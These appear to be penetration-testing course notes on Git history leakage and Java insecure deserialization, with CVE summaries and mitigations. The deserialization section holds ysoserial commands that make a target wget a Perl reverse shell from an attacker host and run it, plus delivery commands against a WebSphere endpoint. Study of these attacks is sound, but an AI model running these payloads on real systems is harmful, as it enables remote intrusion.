
### DVCS / CI-CD Exploitation

**Distributed Version Control Systems**

* Distributed /Decentralized. Everyone has full version history locally
* GIT / Mercurial and many more
* This system allows developers to work in isolation as well as continue working even if the connectivity is lost
* Access could be via HTTP based login or via SSH based access

**GIT Tricks**

* Common Git commands (Full documentation @ https://gitscm.com/docs )
	* git clone (https/ssh)://
	* git add
	* git commit -m "comment"
	* git pull
	* git push
	* git status
* If you get an error about out of sync repository
	* git pull && git push
* Git gives access to full history you can't hide data by removing it in next commit
* Inspection of commit log can help in identifying such information (Manual / Automatic)

![[Pasted image 20240803121951.png]]

### Insecure Deserialization

**Serialization and Deserialization Attacks**

* A means of translating data from one from to another
* Used for the storage or transmission of data across a network

**Serialization is everywhere**

* Almost all languages have support for Serialization
	* Java
	* PHP
	* .NET
	* COM
	* Ruby
	* Python
	* All other OOP Base languages
* Almost all of them have had bugs in Deserialization routines which could lead to Remote Code Execution

**Java Deserialization Vulnerability**

* Another issue which got little media attention
* Publicly disclosed on 28 January 2015
* PoC published on 06 November 2015
* Fix issued starting from 10 November 2015 onwards
* CVE-2015-4852
* Affecting: WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and more

**Even More Serialization**

* CVE-2020-4448 IBM WebSphere
	* Versions: 7.0, 8.0, 8.5, and 9.0
	* Affected components: BroadcastMessageManager class
* CVE-2020-4280 IBM QRadar SIEM
	* Versions 7.4.0 to 7.4.1 GA, 7.3.0 to 7.3.3 Patch 4
	* Affected components: QRadar RemoteJavaScript Servlet

**Java Serialization: How to Detect

* Serialized objects are generally sent across in base64 format. Look for "rO0AB" or if raw binary is passed look for the hex string "AC ED 00 05 73 72" in requests and responses

**Java Serialization: How to Attack**

* We need to send the attack in serialized payload format
* ysoserial: A proof of concept tool to generate serialized payloads
* Sometimes the remote server might not have nc for reverse shell
* If you use file-based shell, you can deliver the reverse shell using wget or curl

**Java Serialization: Payload Generation

* Create the payload to retrieve the Perl code from Kali

```bash
java -jar ysoserial-all.jar CommonsCollections1 'wget http://192.168.X.206/perl-reverse-shell.pl -O /tmp/shell.pl' > payload_wget.bin
```

* Create the payload that will call the Perl code and give us shell access

```bash
java -jar ysoserial-all.jar CommonsCollections1 'perl /tmp/shell.pl 192.168.X.206 9999' > payload_exe.bin
```

**Java Serialization: Exploit Delivery

* Execute the payload to retrieve the Perl code from Kali

```bash
sh websphere-2015-deserialization-exploit.sh https://192.168.3.150:8880/ payload_wget.bin
```

* Execute the payload that will call the Perl code and give us shell access

```bash
sh websphere-2015-deserialization-exploit.sh https://192.168.3.150:8880/ payload_exe.bin
```

**Cisco Webex Meetings: CVE-2022-20763: Java Deserialization**

* Deserialization vulnerability which exists in Cisco Webex Meetings.
* Affected versions: Cloud-based Cisco Webex Meetings.
* Affected components: Login and authorization modules.
* An attacker could exploit this vulnerability by sending malicious login requests to the Cisco Webex Meetings service

**Mitigation Steps**

* No easy solution for existing applications, worst case may require architectural overhaul.
* Never provide user-controlled data directly to de(un)serialize functions
* Prefer JSON instead of serialization options
* Allow list the classes you want to deserialize anything else goes /dev/null
* Automated solutions
	* https://github.com/kantega/notsoserial → Deserialization Firewall
	* https://github.com/ikkisoft/SerialKiller → Lookahead Deserializer